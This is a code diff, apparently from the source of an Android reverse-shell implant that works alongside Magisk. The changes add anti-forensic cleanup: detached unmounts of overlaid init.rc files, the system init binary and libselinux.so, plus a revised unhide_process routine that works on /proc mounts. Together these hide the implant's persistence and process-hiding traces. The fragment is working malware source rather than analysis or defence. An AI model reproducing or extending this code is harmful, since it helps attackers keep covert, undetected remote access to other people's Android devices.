@@ -46,8 +46,12 @@
 #define DEBUG_EXECUTOR              "/debug_ramdisk/executor"
 #define NEW_MAGISK_PATH             "/debug_ramdisk/magisk"
 
+#define INITRC                      "/init.rc"
 #define INITRC_SYSTEM               "/system/etc/init/hw/init.rc"
 #define INIT_BIN_SYSTEM             "/system/bin/init"
+
+#define LIBSELINUX                  "/system/lib/libselinux.so"
+#define LIBSELINUX64                "/system/lib64/libselinux.so"
 
 
 bool check_fs_decrypted() {
@@ -79,7 +83,7 @@ int unhide_process(pid_t pid) {
 
     char buf[32];
     snprintf(buf, 31, "/proc/%d", pid);
-    return umount(buf);
+    return umount2(buf, MNT_DETACH);
 }
 
 void block_signals() {
@@ -249,11 +253,21 @@ int main(int argc, char** argv, char** envp) {
         delprop(svc_name.c_str());
     }
 
-    // Unmount init.rc on android 11+ (if no magisk, i.e. revshell is not at debug_ramdisk)
-    if (access(INITRC_SYSTEM, F_OK) == 0 && access(DEBUG_REVSHELL, F_OK) != 0) {
-        ALOGD("Unmounting new init.rc");
-        umount2(INITRC_SYSTEM, MNT_DETACH);
+    // Unmount init.rc in ramdisk
+    umount2(INITRC, MNT_DETACH);
+
+    // Unmount SAR stuff in /system (if no magisk in debug_ramdisk)
+    if (access(INIT_BIN_SYSTEM, F_OK) == 0 && access(NEW_MAGISK_PATH, F_OK) != 0) {
+        ALOGD("Unmounting SAR stuff");
         umount2(INIT_BIN_SYSTEM, MNT_DETACH);
+        // Unmount init.rc on android 11+
+        if (access(INITRC_SYSTEM, F_OK) == 0)
+            umount2(INITRC_SYSTEM, MNT_DETACH);
+        // Unmount libselinux
+        if (access(LIBSELINUX64, F_OK) == 0)
+            umount2(LIBSELINUX64, MNT_DETACH);
+        else if (access(LIBSELINUX, F_OK) == 0)
+            umount2(LIBSELINUX, MNT_DETACH);
     }
 
     // Cleanup /sbin on rootfs
